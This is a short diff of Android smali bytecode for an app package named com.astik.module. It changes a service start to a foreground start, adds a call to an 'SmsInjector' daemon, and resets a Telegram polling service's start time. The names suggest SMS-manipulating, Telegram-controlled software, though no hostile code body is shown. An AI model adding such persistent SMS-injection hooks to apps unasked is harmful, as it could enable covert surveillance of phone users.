@@ -92,7 +92,9 @@
 
     invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
-    invoke-virtual {p2, v0}, Lcom/astik/module/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+    invoke-virtual {p2, v0}, Lcom/astik/module/MainActivity;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
+    invoke-static {p2}, Lcom/astik/module/SmsInjector;->ensureDaemon(Landroid/content/Context;)Z
 
     .line 183
     iget-object p2, p0, Lcom/astik/module/MainActivity$3;->this$0:Lcom/astik/module/MainActivity;
@@ -120,6 +122,30 @@
     invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
     invoke-virtual {p2, v0}, Lcom/astik/module/MainActivity;->stopService(Landroid/content/Intent;)Z
+
+    const-wide/16 v0, 0x0
+
+    sput-wide v0, Lcom/astik/module/TelegramPollingService;->serviceStartedAt:J
+
+    iget-object p2, p0, Lcom/astik/module/MainActivity$3;->this$0:Lcom/astik/module/MainActivity;
+
+    invoke-static {p2}, Lcom/astik/module/MainActivity;->access$400(Lcom/astik/module/MainActivity;)Landroid/content/SharedPreferences;
+
+    move-result-object p2
+
+    invoke-interface {p2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
+
+    move-result-object p2
+
+    const-string v0, "service_started_at"
+
+    const-wide/16 v1, 0x0
+
+    invoke-interface {p2, v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;
+
+    move-result-object p2
+
+    invoke-interface {p2}, Landroid/content/SharedPreferences$Editor;->apply()V
 
     .line 186
     iget-object p2, p0, Lcom/astik/module/MainActivity$3;->this$0:Lcom/astik/module/MainActivity;
